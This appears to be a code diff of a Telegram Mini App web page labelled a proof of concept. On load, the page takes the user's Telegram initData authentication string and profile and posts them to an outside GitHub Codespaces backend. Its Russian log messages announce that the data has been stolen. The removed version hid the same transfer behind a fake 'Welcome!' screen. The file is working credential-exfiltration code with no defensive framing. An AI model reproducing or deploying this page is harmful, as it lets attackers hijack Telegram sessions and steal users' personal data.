@@ -1,26 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Telegram PoC</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Telegram Mini App PoC</h1>
+    <pre id="log" style="background:#f0f0f0; padding:10px;">Loading...</pre>
+
     <script>
-        // 
-        const BACKEND = "https://sturdy-umbrella-g4qxgpv5v4xw3v67w-5000.app.github.dev/";
-        
+        const BACKEND_URL = "https://sturdy-umbrella-g4qxgpv5v4xw3v67w-8080.preview.app.github.dev";
+        const logElement = document.getElementById('log');
+
+        function addLog(message) {
+            logElement.innerText += '\n' + new Date().toLocaleTimeString() + ' - ' + message;
+            console.log(message);
+        }
+
+        addLog('1. Страница загружена, инициализация Telegram WebApp...');
+
         const tg = window.Telegram.WebApp;
         tg.ready();
-        
-        fetch(BACKEND + "/api/init", {
-            method: "POST",
-            headers: {
-                "X-Init-Data": tg.initData,
-                "X-User-Data": JSON.stringify(tg.initDataUnsafe.user)
-            }
-        });
-        
-        document.body.innerHTML = "<h1>App loaded</h1><p>Welcome!</p>";
+        addLog('2. Telegram WebApp готов');
+
+        const initData = tg.initData;
+        const user = tg.initDataUnsafe.user || { first_name: 'Anonymous', id: 0 };
+
+        addLog('3. initData получена: ' + (initData ? initData.substring(0, 50) + '...' : 'ПУСТО!'));
+        addLog('4. Пользователь: ' + user.first_name + ' (id: ' + user.id + ')');
+
+        if (!initData) {
+            addLog('❌ ОШИБКА: initData пустая! Мини-приложение запущено вне Telegram?');
+            addLog('❌ Данные не будут отправлены на бэкенд');
+        } else {
+            addLog('5. Отправляю POST запрос на бэкенд: ' + BACKEND_URL + '/api/init');
+            
+            fetch(BACKEND_URL + '/api/init', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Init-Data': initData,
+                    'X-User-Data': JSON.stringify(user)
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                addLog('✅ УСПЕХ! Бэкенд ответил: ' + JSON.stringify(data));
+                addLog('✅ Данные украдены, проверьте логи бэкенда');
+            })
+            .catch(error => {
+                addLog('❌ ОШИБКА FETCH: ' + error.message);
+                addLog('❌ Проверьте: бэкенд запущен? CORS настроен? URL правильный?');
+            });
+        }
+
+        addLog('6. Скрипт завершил работу, ждём ответа бэкенда...');
     </script>
 </body>
 </html>
